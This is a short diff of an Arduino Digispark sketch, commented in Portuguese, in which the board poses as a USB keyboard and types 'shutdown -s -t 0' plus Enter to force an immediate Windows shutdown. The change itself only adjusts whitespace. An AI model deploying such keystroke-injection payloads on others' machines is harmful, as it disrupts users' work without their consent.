@@ -49,11 +49,10 @@ void setup() {
 
   // Digita o comando de desligamento imediato
   DigiKeyboard.print("shutdown -s -t 0");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-
-  
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);  
 }
 
 void loop() {
   // Vazio, pois o Digispark roda setup() apenas uma vez
 }
+
